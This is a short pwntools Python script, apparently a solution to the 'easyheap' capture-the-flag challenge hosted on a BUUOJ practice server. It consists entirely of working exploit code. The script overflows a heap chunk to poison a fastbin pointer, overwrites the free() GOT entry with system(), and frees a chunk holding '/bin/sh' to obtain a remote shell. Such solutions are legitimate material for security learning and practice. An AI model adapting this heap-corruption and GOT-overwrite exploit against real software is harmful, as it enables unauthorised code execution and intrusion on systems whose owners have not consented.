from pwn import *

elf = ELF('./easyheap')
libc = ELF('../../libc/libc-2.23_64.so')
# r = process('./easyheap', env={'LD_PRELOAD': '../../libc/libc-2.23_64.so'})
r = remote('node3.buuoj.cn', 27002)
context.arch = 'amd64'
heaparray_addr = 0x6020E0


def add(size, content):
    r.recvuntil('Your choice :')
    r.send('1')
    r.recvuntil('Size of Heap : ')
    r.send(str(size))
    r.recvuntil('Content of heap:')
    r.send(content)


def edit(index, size, content):
    r.recvuntil('Your choice :')
    r.send('2')
    r.recvuntil('Index :')
    r.send(str(index))
    r.recvuntil('Size of Heap : ')
    r.send(str(size))
    r.recvuntil('Content of heap : ')
    r.send(content)


def delete(size):
    r.recvuntil('Your choice :')
    r.send('3')
    r.recvuntil('Index :')
    r.send(str(size))


add(0x10, 'da')
add(0x60, 'da')
delete(1)
edit(0, 0x28, flat([0, 0, 0, 0x71, heaparray_addr - 0x33]))
add(0x60, '/bin/sh\x00')
add(0x60, 'a' * 0x23 + p64(elf.got['free']))
edit(0, 8, p64(elf.plt['system']))
delete(1)
r.interactive()
